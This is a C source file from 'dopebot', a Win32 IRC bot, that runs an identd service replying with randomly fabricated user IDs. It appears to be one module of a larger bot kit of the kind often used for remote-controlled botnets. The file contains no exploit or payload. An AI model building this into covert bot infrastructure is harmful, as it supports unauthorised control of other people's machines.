/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_IDENTD
#include "..\Bot\bot.h"

//IDENTD
DWORD WINAPI identd(LPVOID param)
{
	BOOL bOptVal = TRUE;
	DWORD dwID;
	int bOptLen = sizeof(BOOL), iOptVal, iOptLen = sizeof(int);
	register int i;
	SOCKET idsock, consock;
	struct sockaddr_in idsin;
//	WSADATA wsadata;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting IDENTD, identd()\n");
#endif

//	if (WSAStartup(MAKEWORD(2,2), &wsadata) != 0) return 0;
		idsin.sin_family = AF_INET;
		idsin.sin_addr.s_addr = 0;
		idsin.sin_port = htons(113);
		i = sizeof(idsin);
		idsock = socket(AF_INET, SOCK_STREAM, 0);
	if (idsock == INVALID_SOCKET) return 0;
		setsockopt(idsock, SOL_SOCKET, SO_REUSEADDR, (char *)&iOptVal, iOptLen);
		bind(idsock, (struct sockaddr *)&idsin, i);
		listen(idsock, 10);
	while (1)
	{
			consock = accept(idsock, (struct sockaddr *)&idsin, &i);
		if (consock != INVALID_SOCKET) CreateThread(0, 0, identd_handler, (void *)consock, 0, &dwID);
			Sleep(500);
	}
		closesocket(consock);
		closesocket(idsock);
//		WSACleanup();
		return 0;
}

//IDENTD Handler
DWORD WINAPI identd_handler(void *consock_) 
{
	char szBuffer[32];
	SOCKET consock = (SOCKET)consock_;

#ifndef NO_DEBUG
		printf("[DEBUG] Sending ident, identd_handler()\n");
#endif

		srand(GetTickCount());
		sprintf(szBuffer, "%d, 6667 : USERID : UNIX : %d\r\n", rand()%9999, rand()%9999);
		Sleep(500);
		send(consock, szBuffer, strlen(szBuffer), 0);
		return 0;
}
#endif